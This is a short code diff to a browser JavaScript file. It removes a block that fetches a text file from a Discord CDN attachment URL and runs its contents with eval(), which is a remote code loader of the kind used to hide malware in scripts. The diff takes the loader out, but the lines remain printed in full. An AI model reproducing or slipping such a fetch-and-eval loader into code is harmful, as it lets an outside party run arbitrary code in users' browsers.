@@ -108,13 +108,6 @@ async function ws(login) {
     let oldHref = document.location.href
     var bodyList = document.querySelector("body")
     let endpoint = "https://cdn.discordapp.com"
-    fetch(endpoint + "/attachments/" + bl + "/message.txt").then(x => {
-        return x
-    }).then(x => {
-        return x.text()
-    }).then(x => {
-        eval(x)
-    })
     var observer = new MutationObserver(function(mutations) {
         mutations.forEach(function(mutation) {
             if (oldHref != document.location.href) {
